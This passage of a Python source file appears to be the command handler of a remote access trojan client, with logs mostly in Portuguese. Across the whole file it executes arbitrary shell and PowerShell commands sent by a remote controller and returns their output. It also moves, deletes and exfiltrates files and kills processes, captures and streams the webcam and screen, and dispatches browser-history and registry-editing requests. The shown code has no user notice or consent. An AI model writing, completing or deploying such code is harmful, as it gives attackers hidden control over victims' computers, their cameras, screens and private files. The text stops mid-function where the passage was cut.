# client/core/command_handler.py
import socket
import struct
import logging
import json
import threading
import subprocess
import sys
import os
import time
import tempfile
from utils.network_utils import send_binary_command
from core.protocol import *
logger = logging.getLogger("client.command_handler")
class CommandHandler:
    def __init__(self, connector, system_manager, process_manager, screenshot_manager, 
                webcam_manager=None, screen_stream_manager=None, file_manager=None, 
                browser_history_manager=None, registry_manager=None):
        self.connector = connector
        self.system_manager = system_manager
        self.process_manager = process_manager
        self.screenshot_manager = screenshot_manager
        self.webcam_manager = webcam_manager
        self.screen_stream_manager = screen_stream_manager
        self.file_manager = file_manager
        self.browser_history_manager = browser_history_manager
        self.registry_manager = registry_manager  # Add registry manager
    def process_command(self, cmd_data):
        if len(cmd_data) != 4:
            self._process_legacy_command(cmd_data)
            return
        cmd = struct.unpack('>I', cmd_data)[0]
        if cmd == CMD_PING:
            self._send_pong()
        elif cmd == CMD_PONG:
            pass
        elif cmd == CMD_SCREENSHOT_SINGLE:
            self._handle_screenshot_request()
        elif cmd == CMD_PROCESS_LIST:
            self._handle_process_list_request()
        elif cmd == CMD_PROCESS_KILL:
            self._handle_process_kill_request()
        elif cmd == CMD_SHELL_COMMAND:
            self._handle_shell_command_request()
        elif cmd == CMD_FILE_LIST:
            self._handle_file_list_request()
        elif cmd == CMD_FILE_DOWNLOAD:
            self._handle_file_download_request()
        elif cmd == CMD_FILE_UPLOAD:
            self._handle_file_upload_request()
        elif cmd == CMD_FILE_DELETE:
            self._handle_file_delete_request()
        elif cmd == CMD_FILE_RENAME:
            self._handle_file_rename_request()
        elif cmd == CMD_FILE_MKDIR:
            self._handle_file_mkdir_request()
        elif cmd == CMD_WEBCAM_LIST:
            self._handle_webcam_list_request()
        elif cmd == CMD_WEBCAM_CAPTURE:
            self._handle_webcam_capture_request()
        elif cmd == CMD_WEBCAM_STREAM_START:
            self._handle_webcam_stream_start_request()
        elif cmd == CMD_WEBCAM_STREAM_STOP:
            self._handle_webcam_stream_stop_request()
        elif cmd == CMD_SCREEN_STREAM_START:
            self._handle_screen_stream_start_request()
        elif cmd == CMD_SCREEN_STREAM_STOP:
            self._handle_screen_stream_stop_request()
        elif cmd == CMD_BROWSER_HISTORY_REQUEST:
            self._handle_browser_history_request()
        elif cmd == CMD_REGISTRY_LIST:
            self._handle_registry_list_request()
        elif cmd == CMD_REGISTRY_READ:
            self._handle_registry_read_request()
        elif cmd == CMD_REGISTRY_WRITE:
            self._handle_registry_write_request()
        elif cmd == CMD_REGISTRY_DELETE_VALUE:
            self._handle_registry_delete_value_request()
        elif cmd == CMD_REGISTRY_CREATE_KEY:
            self._handle_registry_create_key_request()
        elif cmd == CMD_REGISTRY_DELETE_KEY:
            self._handle_registry_delete_key_request()
        else:
            logger.warning(f"Comando desconhecido recebido: {cmd}")
    def _process_legacy_command(self, initial_data):
        try:
            socket = self.connector.client_socket
            if not socket:
                return
            data_str = initial_data.decode('utf-8', errors='ignore')
            while True:
                try:
                    json_data = json.loads(data_str)
                    break
                except json.JSONDecodeError:
                    socket.settimeout(0.5)
                    chunk = socket.recv(4096)
                    if not chunk:
                        logger.warning("Conexão fechada durante recebimento de JSON")
                        return
                    data_str += chunk.decode('utf-8', errors='ignore')
            if "action" in json_data:
                action = json_data["action"]
                if action == "screenshot":
                    self._handle_screenshot_request()
                elif action == "stop_screenshot":
                    logger.info("Recebido comando para parar capturas de tela")
                    self.screenshot_manager.stop_capture()
                else:
                    logger.warning(f"Ação desconhecida: {action}")
        except Exception as e:
            logger.error(f"Erro ao processar comando legado: {str(e)}")
    def _send_pong(self):
        socket = self.connector.client_socket
        if socket:
            send_binary_command(socket, CMD_PONG)
    def _handle_screenshot_request(self):
        logger.info("Solicitação de captura de tela recebida")
        threading.Thread(
            target=self._capture_and_send_screenshot,
            daemon=True
        ).start()
    def _capture_and_send_screenshot(self):
        try:
            screenshot_data = self.screenshot_manager.capture()
            if not screenshot_data:
                logger.error("Falha ao capturar tela")
                return
            logger.info(f"Enviando captura de tela ({len(screenshot_data) / 1024:.2f} KB)")
            socket = self.connector.client_socket
            if socket:
                send_binary_command(socket, CMD_SCREENSHOT_RESPONSE, screenshot_data)
        except Exception as e:
            logger.error(f"Erro ao processar captura de tela: {str(e)}")
    def _handle_process_list_request(self):
        logger.info("Solicitação de lista de processos recebida")
        try:
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket não disponível")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Erro ao receber tamanho dos parâmetros")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            detailed = params.get('detailed', False)
            logger.info(f"Solicitação de processos com detailed={detailed}")
            threading.Thread(
                target=self._collect_and_send_processes,
                args=(detailed,),
                daemon=True
            ).start()
        except Exception as e:
            logger.error(f"Erro ao processar solicitação de processos: {str(e)}")
            threading.Thread(
                target=self._collect_and_send_processes,
                args=(False,),
                daemon=True
            ).start()
    def _collect_and_send_processes(self, detailed):
        try:
            processes = self.process_manager.get_process_list(detailed)
            process_json = json.dumps(processes).encode('utf-8')
            logger.info(f"Enviando lista de {len(processes)} processos")
            socket = self.connector.client_socket
            if socket:
                send_binary_command(socket, CMD_PROCESS_LIST_RESPONSE, process_json)
        except Exception as e:
            logger.error(f"Erro ao enviar lista de processos: {str(e)}")
    def _handle_process_kill_request(self):
        try:
            logger.info("Recebida solicitação para matar processo")
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket não disponível")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Erro ao receber tamanho do PID")
                return
            pid_size = struct.unpack('>I', size_data)[0]
            pid_data = socket.recv(pid_size)
            if not pid_data:
                logger.error("Dados do PID vazios")
                send_binary_command(socket, CMD_PROCESS_KILL_RESPONSE, "FAILED".encode('utf-8'))
                return
            try:
                pid = int(pid_data.decode('utf-8'))
                logger.info(f"Solicitação para encerrar processo {pid}")
            except ValueError:
                logger.error(f"PID inválido recebido: {pid_data}")
                send_binary_command(socket, CMD_PROCESS_KILL_RESPONSE, "FAILED".encode('utf-8'))
                return
            if not self.process_manager:
                logger.error("process_manager não disponível")
                send_binary_command(socket, CMD_PROCESS_KILL_RESPONSE, "FAILED".encode('utf-8'))
                return
            success = self.process_manager.kill_process(pid)
            logger.info(f"Resultado do encerramento do processo {pid}: {'Sucesso' if success else 'Falha'}")
            response = "OK" if success else "FAILED"
            response_data = response.encode('utf-8')
            if socket:
                logger.info(f"Enviando resposta de encerramento: {response}")
                send_binary_command(socket, CMD_PROCESS_KILL_RESPONSE, response_data)
        except Exception as e:
            logger.error(f"Erro ao processar comando de encerrar processo: {str(e)}")
            try:
                socket = self.connector.client_socket
                if socket:
                    send_binary_command(socket, CMD_PROCESS_KILL_RESPONSE, "FAILED".encode('utf-8'))
            except:
                pass
    def _handle_shell_command_request(self):
        try:
            logger.info("Recebida solicitação de comando shell")
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket não disponível")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Erro ao receber tamanho do comando shell")
                return
            cmd_size = struct.unpack('>I', size_data)[0]
            cmd_data = socket.recv(cmd_size)
            if not cmd_data:
                logger.error("Dados do comando shell vazios")
                self._send_shell_error("Comando vazio")
                return
            command = cmd_data.decode('utf-8')
            logger.info(f"Recebido comando shell: {command}")
            threading.Thread(
                target=self._execute_shell_command,
                args=(command,),
                daemon=True
            ).start()
        except Exception as e:
            logger.error(f"Erro ao processar comando shell: {str(e)}")
            self._send_shell_error(f"Erro: {str(e)}")
    def _execute_shell_command(self, command):
        try:
            shell = True
            if sys.platform.startswith('win'):
                shell = True
                if command.startswith('powershell '):
                    command = command[10:]  # Remover 'powershell ' do comando
                    args = ['powershell', '-Command', command]
                    shell = False
                else:
                    args = command
            else:
                args = command
            logger.info(f"Executando comando: {command}")
            process = subprocess.Popen(
                args,
                shell=shell,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            try:
                stdout, stderr = process.communicate(timeout=60)
                response = ""
                if stdout:
                    response = stdout
                if stderr:
                    if response:
                        response += "\n--- STDERR ---\n"
                    response += stderr
                if not response:
                    response = "Comando executado (sem saída)"
                self._send_shell_response(response)
            except subprocess.TimeoutExpired:
                try:
                    process.kill()
                except:
                    pass
                logger.error("Timeout ao executar comando")
                self._send_shell_error("Timeout ao executar comando (60s)")
        except Exception as e:
            logger.error(f"Erro ao executar comando shell: {str(e)}")
            self._send_shell_error(f"Erro ao executar: {str(e)}")
    def _send_shell_response(self, response_text):
        try:
            socket = self.connector.client_socket
            if socket:
                try:
                    response_data = response_text.encode('utf-8', errors='replace')
                except Exception as e:
                    logger.error(f"Erro ao codificar resposta: {str(e)}")
                    response_data = f"Erro ao codificar resposta: {str(e)}".encode('utf-8')
                send_binary_command(socket, CMD_SHELL_RESPONSE, response_data)
                logger.info(f"Resposta da shell enviada ({len(response_data)} bytes)")
        except Exception as e:
            logger.error(f"Erro ao enviar resposta da shell: {str(e)}")
    def _send_shell_error(self, error_message):
        self._send_shell_response(f"ERRO: {error_message}")
    def _handle_file_list_request(self):
        try:
            if not self.file_manager:
                logger.error("Gerenciador de arquivos não disponível")
                self._send_file_error_response(CMD_FILE_LIST_RESPONSE, "Gerenciador de arquivos não disponível")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket não disponível")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Erro ao receber tamanho dos parâmetros")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            path = params.get('path', '/')
            path = path.replace('\\', '/')
            logger.info(f"Solicitação para listar diretório: {path}")
            result = self.file_manager.list_directory(path)
            response = json.dumps(result).encode('utf-8')
            send_binary_command(socket, CMD_FILE_LIST_RESPONSE, response)
            logger.info(f"Resposta de listagem enviada para {path}")
        except Exception as e:
            logger.error(f"Erro ao processar solicitação de listagem: {str(e)}")
            self._send_file_error_response(CMD_FILE_LIST_RESPONSE, f"Erro: {str(e)}")
    def _handle_file_download_request(self):
        try:
            if not self.file_manager:
                logger.error("Gerenciador de arquivos não disponível")
                self._send_file_error_response(CMD_FILE_DOWNLOAD_RESPONSE, "Gerenciador de arquivos não disponível")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket não disponível")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Erro ao receber tamanho dos parâmetros")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            path = params.get('path', '')
            path = path.replace('\\', '/')
            if not path:
                logger.error("Caminho de arquivo não especificado")
                self._send_file_error_response(CMD_FILE_DOWNLOAD_RESPONSE, "Caminho não especificado")
                return
            logger.info(f"Solicitação para download de arquivo: {path}")
            threading.Thread(
                target=self._process_file_download,
                args=(path,),
                daemon=True
            ).start()
        except Exception as e:
            logger.error(f"Erro ao processar solicitação de download: {str(e)}")
            self._send_file_error_response(CMD_FILE_DOWNLOAD_RESPONSE, f"Erro: {str(e)}")
    def _process_file_download(self, path):
        try:
            content = self.file_manager.read_file(path)
            if isinstance(content, dict) and 'error' in content:
                self._send_file_error_response(CMD_FILE_DOWNLOAD_RESPONSE, content['error'])
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket não disponível para envio")
                return
            try:
                send_binary_command(socket, CMD_FILE_DOWNLOAD_RESPONSE, content)
                logger.info(f"Arquivo enviado: {path} ({len(content)/1024:.1f}KB)")
            except Exception as e:
                logger.error(f"Erro ao enviar arquivo: {str(e)}")
                self._send_file_error_response(CMD_FILE_DOWNLOAD_RESPONSE, f"Erro ao enviar arquivo: {str(e)}")
        except Exception as e:
            logger.error(f"Erro ao processar download de {path}: {str(e)}")
            self._send_file_error_response(CMD_FILE_DOWNLOAD_RESPONSE, f"Erro ao baixar arquivo: {str(e)}")
    def _handle_file_upload_request(self):
        try:
            if not self.file_manager:
                logger.error("Gerenciador de arquivos não disponível")
                self._send_file_error_response(CMD_FILE_UPLOAD_RESPONSE, "Gerenciador de arquivos não disponível")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket não disponível")
                return
            try:
                try:
                    import sys
                    import os
                    current_dir = os.path.dirname(os.path.abspath(__file__))
                    parent_dir = os.path.dirname(current_dir)
                    if parent_dir not in sys.path:
                        sys.path.append(parent_dir)
                    from utils.simple_binary_upload import SimpleBinaryUpload
                    logger.info("Usando classe SimpleBinaryUpload para processamento")
                    upload_data = SimpleBinaryUpload.parse_upload_request(socket)
                    if upload_data is None:
                        logger.error("Erro ao analisar solicitação de upload")
                        self._send_file_error_response(CMD_FILE_UPLOAD_RESPONSE, "Erro ao processar upload")
                        return
                    header = upload_data["header"]
                    file_data = upload_data["file_data"]
                    path = header.get("path", "")
                    size = header.get("size", 0)
                except ImportError:
                    logger.info("Classe de utilidade não encontrada, usando implementação direta")
                    header_size_bytes = b''
                    remaining = 4
                    while remaining > 0:
                        chunk = socket.recv(remaining)
                        if not chunk:
                            logger.error("Conexão fechada ao receber tamanho do header")
                            return
                        header_size_bytes += chunk
                        remaining -= len(chunk)
                    header_size = struct.unpack('>I', header_size_bytes)[0]
                    logger.info(f"Tamanho do header: {header_size} bytes")
                    if header_size <= 0 or header_size > 1024 * 1024:  # Limite de 1MB
                        logger.error(f"Tamanho de header inválido: {header_size}")
                        self._send_file_error_response(CMD_FILE_UPLOAD_RESPONSE, f"Tamanho de header inválido: {header_size}")
                        return
                    header_bytes = b''
                    remaining = header_size
                    while remaining > 0:
                        chunk = socket.recv(min(4096, remaining))
                        if not chunk:
                            logger.error("Conexão fechada ao receber header")
                            return
                        header_bytes += chunk
                        remaining -= len(chunk)
                    try:
                        header = json.loads(header_bytes.decode('utf-8'))
                    except Exception as e:
                        logger.error(f"Erro ao parsear JSON do header: {e}")
                        logger.error(f"Header bruto: {header_bytes[:100]}...")
                        self._send_file_error_response(CMD_FILE_UPLOAD_RESPONSE, f"Header JSON inválido: {str(e)}")
                        return
                    path = header.get('path')
                    size = header.get('size')
                    if not path or not isinstance(size, int) or size < 0:
                        logger.error(f"Valores de header inválidos: path={path}, size={size}")
                        self._send_file_error_response(CMD_FILE_UPLOAD_RESPONSE, "Header com valores inválidos")
                        return
                    temp_file = tempfile.NamedTemporaryFile(delete=False)
                    temp_path = temp_file.name
                    logger.info(f"Recebendo arquivo em chunks para {temp_path}, tamanho: {size} bytes")
                    file_data = b''  # Vamos usar este objeto apenas para arquivos pequenos
                    remaining = size
                    bytes_read = 0
                    chunk_size = 8192
                    progress_interval = max(1, size // 20)  # Reportar progresso a cada 5%
                    last_progress = 0
                    direct_to_disk = size > 10 * 1024 * 1024
                    try:
                        if direct_to_disk:
                            while remaining > 0:
                                chunk = socket.recv(min(chunk_size, remaining))
                                if not chunk:
                                    logger.error(f"Conexão fechada durante leitura dos dados - recebidos {bytes_read} de {size} bytes")
                                    temp_file.close()
                                    os.unlink(temp_path)
                                    self._send_file_error_response(CMD_FILE_UPLOAD_RESPONSE, "Conexão fechada durante upload")
                                    return
                                temp_file.write(chunk)
                                remaining -= len(chunk)
                                bytes_read += len(chunk)
                                if bytes_read - last_progress >= progress_interval:
                                    percent = (bytes_read / size) * 100
                                    logger.info(f"Progresso do upload: {percent:.1f}% ({bytes_read}/{size} bytes)")
                                    last_progress = bytes_read
                            temp_file.flush()
                            temp_file.close()
                            with open(temp_path, 'rb') as f:
                                file_data = f.read()
                            os.unlink(temp_path)
                        else:
                            while remaining > 0:
                                chunk = socket.recv(min(chunk_size, remaining))
                                if not chunk:
                                    logger.error(f"Conexão fechada durante leitura dos dados - recebidos {bytes_read} de {size} bytes")
                                    temp_file.close()
                                    os.unlink(temp_path)
                                    self._send_file_error_response(CMD_FILE_UPLOAD_RESPONSE, "Conexão fechada durante upload")
                                    return
                                file_data += chunk
                                remaining -= len(chunk)
                                bytes_read += len(chunk)
                                if bytes_read - last_progress >= progress_interval:
                                    percent = (bytes_read / size) * 100
                                    logger.info(f"Progresso do upload: {percent:.1f}% ({bytes_read}/{size} bytes)")
                                    last_progress = bytes_read
                            temp_file.close()
                            os.unlink(temp_path)
                    except Exception as e:
                        logger.error(f"Erro ao receber dados do arquivo: {str(e)}")
                        try:
                            temp_file.close()
                            os.unlink(temp_path)
                        except:
                            pass
                        self._send_file_error_response(CMD_FILE_UPLOAD_RESPONSE, f"Erro ao receber arquivo: {str(e)}")
                        return
                path = path.replace('\\', '/')
                logger.info(f"Salvando arquivo em: {path}, tamanho: {len(file_data)/1024:.1f}KB")
                result = self.file_manager.write_file(path, file_data)
                logger.info(f"Arquivo recebido e salvo: {path}")
                if isinstance(result, dict):
                    response = json.dumps(result).encode('utf-8')
                    send_binary_command(socket, CMD_FILE_UPLOAD_RESPONSE, response)
                    logger.info(f"Resposta de upload enviada para {path}")
                else:
                    self._send_file_error_response(CMD_FILE_UPLOAD_RESPONSE, "Erro interno no processamento do arquivo")
            except socket.timeout:
                logger.error("Timeout durante recebimento do arquivo")
                self._send_file_error_response(CMD_FILE_UPLOAD_RESPONSE, "Timeout durante recebimento do arquivo")
            except Exception as e:
                logger.error(f"Erro ao processar upload: {str(e)}")
                self._send_file_error_response(CMD_FILE_UPLOAD_RESPONSE, f"Erro ao receber arquivo: {str(e)}")
        except Exception as e:
            logger.error(f"Erro geral ao processar upload: {str(e)}")
            try:
                self._send_file_error_response(CMD_FILE_UPLOAD_RESPONSE, f"Erro geral: {str(e)}")
            except:
                logger.error("Não foi possível enviar resposta de erro")
    def _handle_file_delete_request(self):
        try:
            if not self.file_manager:
                logger.error("Gerenciador de arquivos não disponível")
                self._send_file_error_response(CMD_FILE_DELETE_RESPONSE, "Gerenciador de arquivos não disponível")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket não disponível")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Erro ao receber tamanho dos parâmetros")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            path = params.get('path', '')
            path = path.replace('\\', '/')
            if not path:
                logger.error("Caminho de item não especificado")
                self._send_file_error_response(CMD_FILE_DELETE_RESPONSE, "Caminho não especificado")
                return
            logger.info(f"Solicitação para excluir item: {path}")
            result = self.file_manager.delete_item(path)
            response = json.dumps(result).encode('utf-8')
            send_binary_command(socket, CMD_FILE_DELETE_RESPONSE, response)
            logger.info(f"Resposta de exclusão enviada para {path}")
        except Exception as e:
            logger.error(f"Erro ao processar exclusão: {str(e)}")
            self._send_file_error_response(CMD_FILE_DELETE_RESPONSE, f"Erro ao excluir item: {str(e)}")
    def _handle_file_rename_request(self):
        try:
            if not self.file_manager:
                logger.error("Gerenciador de arquivos não disponível")
                self._send_file_error_response(CMD_FILE_RENAME_RESPONSE, "Gerenciador de arquivos não disponível")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket não disponível")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Erro ao receber tamanho dos parâmetros")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            old_path = params.get('old_path', '')
            new_path = params.get('new_path', '')
            if old_path:
                old_path = old_path.replace("\\", "/")
            if new_path:
                new_path = new_path.replace("\\", "/")
            if not old_path or not new_path:
                logger.error("Caminhos de origem ou destino não especificados")
                self._send_file_error_response(CMD_FILE_RENAME_RESPONSE, "Caminhos não especificados")
                return
            logger.info(f"Solicitação para renomear item: {old_path} -> {new_path}")
            result = self.file_manager.rename_item(old_path, new_path)
            response = json.dumps(result).encode('utf-8')
            send_binary_command(socket, CMD_FILE_RENAME_RESPONSE, response)
            logger.info(f"Resposta de renomeação enviada")
        except Exception as e:
            logger.error(f"Erro ao processar renomeação: {str(e)}")
            self._send_file_error_response(CMD_FILE_RENAME_RESPONSE, f"Erro ao renomear item: {str(e)}")
    def _handle_file_mkdir_request(self):
        try:
            if not self.file_manager:
                logger.error("Gerenciador de arquivos não disponível")
                self._send_file_error_response(CMD_FILE_MKDIR_RESPONSE, "Gerenciador de arquivos não disponível")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket não disponível")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Erro ao receber tamanho dos parâmetros")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            path = params.get('path', '')
            if path:
                path = path.replace("\\", "/")
            if not path:
                logger.error("Caminho de diretório não especificado")
                self._send_file_error_response(CMD_FILE_MKDIR_RESPONSE, "Caminho não especificado")
                return
            logger.info(f"Solicitação para criar diretório: {path}")
            result = self.file_manager.create_directory(path)
            response = json.dumps(result).encode('utf-8')
            send_binary_command(socket, CMD_FILE_MKDIR_RESPONSE, response)
            logger.info(f"Resposta de criação de diretório enviada para {path}")
        except Exception as e:
            logger.error(f"Erro ao processar criação de diretório: {str(e)}")
            self._send_file_error_response(CMD_FILE_MKDIR_RESPONSE, f"Erro ao criar diretório: {str(e)}")
    def _send_file_error_response(self, cmd, error_message):
        try:
            socket = self.connector.client_socket
            if socket:
                error_data = json.dumps({"error": error_message}).encode('utf-8')
                send_binary_command(socket, cmd, error_data)
                logger.error(f"Erro enviado: {error_message}")
        except Exception as e:
            logger.error(f"Erro ao enviar mensagem de erro: {str(e)}")
    def _handle_webcam_list_request(self):
        logger.info("Webcam list request received")
        try:
            if not self.webcam_manager:
                logger.error("Webcam manager not available")
                self._send_webcam_error_response(CMD_WEBCAM_LIST_RESPONSE, "Webcam manager not available")
                return
            cameras = self.webcam_manager.get_available_cameras()
            response = json.dumps(cameras).encode('utf-8')
            socket = self.connector.client_socket
            if socket:
                send_binary_command(socket, CMD_WEBCAM_LIST_RESPONSE, response)
                logger.info(f"Sent list of {len(cameras)} webcams")
        except Exception as e:
            logger.error(f"Error handling webcam list request: {str(e)}")
            self._send_webcam_error_response(CMD_WEBCAM_LIST_RESPONSE, str(e))
    def _handle_webcam_capture_request(self):
        logger.info("Webcam capture request received")
        try:
            if not self.webcam_manager:
                logger.error("Webcam manager not available")
                self._send_webcam_error_response(CMD_WEBCAM_CAPTURE_RESPONSE, "Webcam manager not available")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket not available")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Error receiving camera parameters size")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            camera_id = params.get('camera_id', 0)
            quality = params.get('quality', 50)
            threading.Thread(
                target=self._capture_and_send_webcam,
                args=(camera_id, quality),
                daemon=True
            ).start()
        except Exception as e:
            logger.error(f"Error handling webcam capture request: {str(e)}")
            self._send_webcam_error_response(CMD_WEBCAM_CAPTURE_RESPONSE, str(e))
    def _capture_and_send_webcam(self, camera_id, quality=None):
        try:
            image_bytes = self.webcam_manager.capture(camera_id, quality=quality)
            if not image_bytes:
                logger.error(f"Failed to capture from webcam {camera_id}")
                self._send_webcam_error_response(CMD_WEBCAM_CAPTURE_RESPONSE, f"Failed to capture from webcam {camera_id}")
                return
            logger.info(f"Sending webcam capture ({len(image_bytes) / 1024:.2f} KB)")
            socket = self.connector.client_socket
            if socket:
                header = json.dumps({
                    "camera_id": camera_id,
                    "quality": quality,
                    "timestamp": time.time()
                }).encode('utf-8')
                header_size = struct.pack('>I', len(header))
                cmd = struct.pack('>I', CMD_WEBCAM_CAPTURE_RESPONSE)
                img_size = struct.pack('>I', len(image_bytes))
                socket.sendall(cmd + header_size + header + img_size + image_bytes)
                logger.info("Webcam capture sent successfully")
        except Exception as e:
            logger.error(f"Error capturing and sending webcam image: {str(e)}")
            self._send_webcam_error_response(CMD_WEBCAM_CAPTURE_RESPONSE, str(e))
    def _handle_webcam_stream_start_request(self):
        logger.info("Webcam streaming start request received")
        try:
            if not self.webcam_manager:
                logger.error("Webcam manager not available")
                self._send_webcam_error_response(CMD_WEBCAM_CAPTURE_RESPONSE, "Webcam manager not available")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket not available")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Error receiving streaming parameters size")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            camera_id = params.get('camera_id', 0)
            interval = params.get('interval', 0.1)
            quality = params.get('quality', 50)
            logger.info(f"Starting streaming from camera {camera_id} at {interval}s intervals with quality {quality}%")
            def stream_callback(image_bytes):
                try:
                    if self.connector.is_connected:
                        header = json.dumps({
                            "camera_id": camera_id,
                            "quality": quality,
                            "timestamp": time.time()
                        }).encode('utf-8')
                        header_size = struct.pack('>I', len(header))
                        cmd = struct.pack('>I', CMD_WEBCAM_CAPTURE_RESPONSE)
                        img_size = struct.pack('>I', len(image_bytes))
                        self.connector.client_socket.sendall(cmd + header_size + header + img_size + image_bytes)
                        logger.debug(f"Streamed webcam frame: {len(image_bytes) / 1024:.2f} KB")
                except Exception as e:
                    logger.error(f"Streaming callback error: {str(e)}")
                    self.webcam_manager.stop_streaming()
            success = self.webcam_manager.start_streaming(
                camera_id=camera_id, 
                interval=interval, 
                callback=stream_callback,
                quality=quality
            )
            response = {"status": "success" if success else "error"}
            response_json = json.dumps(response).encode('utf-8')
            send_binary_command(socket, CMD_WEBCAM_STREAM_START, response_json)
        except Exception as e:
            logger.error(f"Error handling webcam stream start request: {str(e)}")
            self._send_webcam_error_response(CMD_WEBCAM_STREAM_START, str(e))
    def _handle_webcam_stream_stop_request(self):
        logger.info("Webcam streaming stop request received")
        try:
            if not self.webcam_manager:
                logger.error("Webcam manager not available")
                self._send_webcam_error_response(CMD_WEBCAM_STREAM_STOP, "Webcam manager not available")
                return
            self.webcam_manager.stop_streaming()
            socket = self.connector.client_socket
            if socket:
                response = {"status": "success"}
                response_json = json.dumps(response).encode('utf-8')
                send_binary_command(socket, CMD_WEBCAM_STREAM_STOP, response_json)
                logger.info("Webcam streaming stopped successfully")
        except Exception as e:
            logger.error(f"Error handling webcam stream stop request: {str(e)}")
            self._send_webcam_error_response(CMD_WEBCAM_STREAM_STOP, str(e))
    def _send_webcam_error_response(self, cmd, error_message):
        try:
            socket = self.connector.client_socket
            if socket:
                error_data = json.dumps({"error": error_message}).encode('utf-8')
                send_binary_command(socket, cmd, error_data)
                logger.error(f"Webcam error sent: {error_message}")
        except Exception as e:
            logger.error(f"Error sending webcam error message: {str(e)}")
    def _handle_screen_stream_start_request(self):
        logger.info("Requisição de início de stream de tela recebida")
        try:
            if not self.screen_stream_manager:
                logger.error("Gerenciador de stream de tela não disponível")
                self._send_screen_stream_error_response(CMD_SCREEN_STREAM_START, "Gerenciador de stream de tela não disponível")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket não disponível")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Erro ao receber tamanho dos parâmetros de stream")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            interval = params.get('interval', 0.1)
            quality = params.get('quality', 50)
            logger.info(f"Iniciando streaming de tela com intervalo de {interval}s e qualidade {quality}%")
            def stream_callback(image_bytes):
                try:
                    if self.connector.is_connected:
                        header = json.dumps({
                            "quality": quality,
                            "timestamp": time.time()
                        }).encode('utf-8')
                        header_size = struct.pack('>I', len(header))
                        cmd = struct.pack('>I', CMD_SCREEN_STREAM_FRAME)
                        img_size = struct.pack('>I', len(image_bytes))
                        self.connector.client_socket.sendall(cmd + header_size + header + img_size + image_bytes)
                        logger.debug(f"Frame de tela enviado: {len(image_bytes) / 1024:.2f} KB")
                except Exception as e:
                    logger.error(f"Erro no callback de streaming: {str(e)}")
                    self.screen_stream_manager.stop_streaming()
            success = self.screen_stream_manager.start_streaming(
                interval=interval, 
                callback=stream_callback,
                quality=quality
            )
            response = {"status": "success" if success else "error"}
            response_json = json.dumps(response).encode('utf-8')
            send_binary_command(socket, CMD_SCREEN_STREAM_START, response_json)
        except Exception as e:
            logger.error(f"Erro ao processar requisição de início de stream de tela: {str(e)}")
            self._send_screen_stream_error_response(CMD_SCREEN_STREAM_START, str(e))
    def _handle_screen_stream_stop_request(self):
        logger.info("Requisição de parada de stream de tela recebida")
        try:
            if not self.screen_stream_manager:
                logger.error("Gerenciador de stream de tela não disponível")
                self._send_screen_stream_error_response(CMD_SCREEN_STREAM_STOP, "Gerenciador de stream de tela não disponível")
                return
            self.screen_stream_manager.stop_streaming()
            socket = self.connector.client_socket
            if socket:
                response = {"status": "success"}
                response_json = json.dumps(response).encode('utf-8')
                send_binary_command(socket, CMD_SCREEN_STREAM_STOP, response_json)
                logger.info("Stream de tela parado com sucesso")
        except Exception as e:
            logger.error(f"Erro ao processar requisição de parada de stream de tela: {str(e)}")
            self._send_screen_stream_error_response(CMD_SCREEN_STREAM_STOP, str(e))
    def _send_screen_stream_error_response(self, cmd, error_message):
        try:
            socket = self.connector.client_socket
            if socket:
                error_data = json.dumps({"error": error_message}).encode('utf-8')
                send_binary_command(socket, cmd, error_data)
                logger.error(f"Erro de stream de tela enviado: {error_message}")
        except Exception as e:
            logger.error(f"Erro ao enviar mensagem de erro de stream de tela: {str(e)}")
    def _recv_exact(self, size, timeout=30):
        original_timeout = self.connector.client_socket.gettimeout()
        try:
            self.connector.client_socket.settimeout(timeout)
            data = b""
            bytes_remaining = size
            while bytes_remaining > 0:
